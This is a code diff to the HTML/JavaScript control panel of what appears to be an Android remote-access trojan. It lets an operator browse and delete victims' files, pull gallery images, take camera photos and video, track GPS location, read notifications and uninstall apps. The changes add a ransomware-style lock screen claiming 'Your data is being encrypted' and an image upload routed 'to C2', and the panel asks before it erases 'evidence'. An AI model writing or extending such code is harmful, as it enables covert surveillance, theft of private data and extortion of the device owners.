@@ -105,12 +105,23 @@
                 b.innerHTML = `<table><tr><th>App</th><th>PKG</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}</td><td><button onclick="cmd('run ${a.packageName}')">Run</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
             } else if(curMod === 'filemanager') {
                 const fm = d.fm;
-                b.innerHTML = `<div style="display:flex; gap:10px; margin-bottom:10px;"><input id="fmin" placeholder="cd Downloads / storage/emulated/0"><button onclick="cmd(document.getElementById('fmin').value); document.getElementById('fmin').value=''">EXE</button></div><p style="color:var(--primary); font-size:0.7rem; margin-bottom:10px;">Path: ${fm.path}</p><table>${fm.files.map(x=>`<tr><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}')" style="cursor:pointer">${x.isDirectory?'📁':'📄'} ${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}')">DEL</button></td></tr>`).join('')}</table>`;
-                f.innerHTML = `<button onclick="cmd('cd /storage/emulated/0')">SDCARD</button><button onclick="cmd('cd /')">ROOT</button>`;
+                b.innerHTML = `<div style="display:flex; gap:10px; margin-bottom:10px;"><input id="fmin" placeholder="Search / Execute..."><button onclick="cmd(document.getElementById('fmin').value); document.getElementById('fmin').value=''">EXE</button></div>
+                               <div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px; border:1px dashed #2f4040;">📂 ${fm.path}</div>
+                               <table style="font-size:0.85rem;">
+                                 <tr style="background:#1a2525;"><th style="width:40px"></th><th>Name</th><th style="text-align:right">Action</th></tr>
+                                 ${fm.path !== '/' ? `<tr><td>🔙</td><td onclick="cmd('cd ..'); cmd('ls');" style="cursor:pointer; color:var(--dim)">Parent Directory</td><td></td></tr>` : ''}
+                                 ${fm.files.map(x=>`<tr>
+                                   <td style="font-size:1.2rem">${x.isDirectory?'📁':'📄'}</td>
+                                   <td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}'); if('${x.isDirectory}'=='true') cmd('ls');" style="cursor:pointer; ${x.isDirectory?'font-weight:bold; color:var(--primary)':''}">${x.name}</td>
+                                   <td style="text-align:right">
+                                     <button style="padding:4px 8px; font-size:0.7rem;" onclick="if(confirm('Delete ${x.name}?')){ cmd('del ${x.name}'); cmd('ls'); }">DEL</button>
+                                   </td></tr>`).join('')}
+                               </table>`;
+                f.innerHTML = `<button onclick="cmd('cd /storage/emulated/0'); cmd('ls')">SDCARD</button><button onclick="cmd('cd /'); cmd('ls')">ROOT</button>`;
             } else if(curMod === 'gallery') {
                 const g = d.gallery;
-                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
-                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span>PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
+                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${x.name}</p></div>`).join('')}</div>`;
+                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
             } else if(curMod === 'takebackpic' || curMod === 'takefrontpic' || curMod === 'record_back' || curMod === 'record_front') {
                 const m = d.media;
                 if(m.last_img || m.last_vid) {
@@ -124,14 +135,41 @@
                 } else b.innerHTML = `<p style="text-align:center">Waiting GPS Koordinat...</p>`;
                 f.innerHTML = `<button onclick="cmd('get_location')">REFRESH</button><button class="red-btn" onclick="cmd('stop_location')">STOP</button>`;
             } else if(curMod === 'toast') {
-                b.innerHTML = `<p>Message:</p><input id="lmsg" value="SYSTEM LOCKED"><p style="margin-top:10px;">PIN:</p><input id="lpin" value="1234">`;
-                f.innerHTML = `<button class="red-btn" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('toast off')">UNLOCK</button>`;
+                b.innerHTML = `<p style="margin-bottom:5px; color:var(--dim)">System Message:</p>
+                               <textarea id="lmsg" style="background:#1a2525; border:1px solid #3b5e5e; padding:10px; border-radius:15px; color:#fff; width:100%; height:120px; resize:none;">SYSTEM CRITICAL ERROR\nYour data is being encrypted.\nPlease enter the recovery key.</textarea>
+                               <p style="margin-top:15px; margin-bottom:5px; color:var(--dim)">Unlock PIN:</p>
+                               <input id="lpin" value="1337" style="text-align:center; font-size:1.2rem; font-family:monospace;">`;
+                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('toast off')">UNLOCK</button>`;
             } else if(curMod === 'setwallpaper') {
-                b.innerHTML = `<p>Direct Image URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg">`;
-                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
+                b.innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Upload Wallpaper:</p>
+                               <div style="background:#1a2525; padding:20px; border-radius:15px; border:2px dashed #3b5e5e; text-align:center; margin-bottom:15px;">
+                                 <input type="file" id="wfile" style="display:none" onchange="uploadWall(this)">
+                                 <button onclick="document.getElementById('wfile').click()"><i class="fas fa-upload"></i> SELECT IMAGE</button>
+                                 <p id="up-stat" style="font-size:0.7rem; margin-top:10px; color:var(--primary)"></p>
+                               </div>
+                               <p style="margin-bottom:5px; color:var(--dim)">Or URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg">`;
+                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY URL</button>`;
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
             }
+        }
+
+        async function uploadWall(input) {
+            if(!input.files[0]) return;
+            const status = document.getElementById('up-stat');
+            status.innerText = "Uploading to C2...";
+            const formData = new FormData();
+            formData.append('file', input.files[0]);
+            try {
+                const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
+                const data = await res.json();
+                if(data.status === 'ok') {
+                    status.innerText = "Upload Success! Applying...";
+                    // Use window.location.origin to get the base URL of the server
+                    const wallUrl = window.location.origin + '/captured_images/' + data.filename;
+                    cmd('set_wallpaper ' + wallUrl);
+                } else status.innerText = "Upload Failed.";
+            } catch(e) { status.innerText = "Error: " + e; }
         }
 
         async function delFile(f) { if(!confirm('Erase evidence?')) return; await fetch('/api/delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({filename:f})}); hash=""; render(); }
